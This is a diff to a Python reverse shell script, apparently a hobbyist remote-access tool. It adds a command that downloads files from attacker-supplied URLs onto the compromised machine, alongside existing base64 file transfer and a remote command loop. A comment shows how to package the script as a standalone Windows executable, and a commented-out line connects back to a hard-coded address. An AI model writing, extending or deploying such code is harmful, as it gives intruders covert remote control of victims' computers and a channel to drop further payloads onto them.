@@ -8,6 +8,14 @@ import base64
 import shutil
 import sys
 import time
+import requests
+
+def downlaod(url):
+	get_response = requests.get(url)
+	file_name = url.split("/")[-1]
+	with open(file_name,"wb") as out_file:
+		out_file.write(get_response.content)
+
 
 def relibale_send(data):
 	try:
@@ -56,6 +64,14 @@ def shell():
 					file.write(base64.b64decode(file_data))
 			except Exception as e: 
 				print(e)
+		elif command[:3] == "get":
+			try:
+				downlaod(command[4:])
+				relibale_send("send + Donwloaded file from sepeicifed url")
+			except Exception as e:
+				print(e)
+				relibale_send("failed to dowload")
+
 
 		
 		else:
@@ -75,6 +91,8 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 ###sock.connect(("192.168.0.21", 54321))
 connection()
 ###shell()
+## Command used to genertae exe
+##wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile reverseShell.py 
 sock.close()
 
 
